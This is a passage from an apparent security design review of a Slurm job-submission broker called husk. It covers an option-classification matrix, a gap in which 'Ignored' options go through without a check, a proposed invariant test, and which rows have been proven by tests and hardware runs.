| `Forced` | dropped, husk emits its own | rejected, **except** the 7 names in the `dominated`/`dedicated` lists | yes — *because emission is unconditional* |
| `Allowed` | validated, re-emitted | accepted, forwarded verbatim | no — and correctly so, that is the point |
| `Ignored` | dropped **silently** | accepted, forwarded verbatim | **no — and nothing says so** |
| `Rejected` | rejected with a reason | rejected | yes |

The comment at `sbatch.rs:419-423` gets this exactly right for `Forced` — "this is only safe
BECAUSE the emission is unconditional … Anything only CONDITIONALLY emitted must stay in the
reject path" — and the same sentence was never applied to `Ignored`, whose emission is not
conditional but *absent*. Every `Ignored` option is therefore an ungated `#SBATCH` channel by
construction, today `--mail-type`, `--mail-user`, `--wait`, `--quiet`, `--verbose`,
`--parsable`, and whatever is added next. The class needs either a fifth state or a rule:
**`Ignored` is only legal for an option husk also emits an overriding value for.** A registry
invariant test in the style of `interpret_cli_never_reemits_a_forced_option` would pin it.

---

## Answers to the two questions the brief asked directly

**Does `scancel` need a row, or a second matrix?** A **second, small matrix** — the four cells
above. A row would not fit: every sbatch row's channels are *option spellings feeding one
decision*, while scancel's decision is over *data* (which ids) with the option surface
default-denied wholesale, and its control is provenance held in the broker's memory rather
than a value emitted on a command line. What the two matrices **share**, and what drawing
them side by side surfaces, is the environment channel: sbatch's rows all list `SBATCH_*`
and scancel's list nothing, while in the code it is the *sbatch* path that strips env and the
*scancel* path that does not (F6).

**Does the partition row still describe the control after the multi-partition list?** No —
it under-describes it, in husk's favour. "require+force exact partition" should read
*"require; resolve against the operator's allowed set; **re-emit husk's own entry**, never the
request's bytes; refuse a multi-valued request rather than half-honour it."* That is the same
construct-and-re-emit shape as `--chdir`, and it is proven (`T`
`a_job_may_choose_any_allowed_partition_and_nothing_else`; `S/H` `sbatch.partition_list` on
Balfrin with a real two-partition list). The thing the list *did* weaken is not the row but
the paragraph below it — see F7.

## What is closed, and worth saying plainly

Rows 1, 2, 3, 4, 5, 8 (CLI+body), 9, 10, 16, 17, 18 and step rows R1, R2, R4, R5 are all
**proven**, most of them three ways over: a unit test, a selftest arm, and a hardware PASS on
Balfrin at `ebb7b76`. The default-deny construction genuinely holds for every option spelling
I could think to try — 8 further real sbatch options I probed against the live registry
(`--licenses --container --bb --clusters --input --propagate --nice --open-mode`) are all
rejected on both channels with the generic message, which is the class-closing behaviour
working. The parser-differential class the matrix was drawn for (F13/F14/F24/F26/F27) is
closed where the matrix looked. **Every hole found here is somewhere the matrix did not
look**: a second verb (F11), a field outside the option grammar (F2), a token that is not an
option (F4), a class whose name promised a control it does not have (F3, F12), and the
broker's own staging artifact (F1).
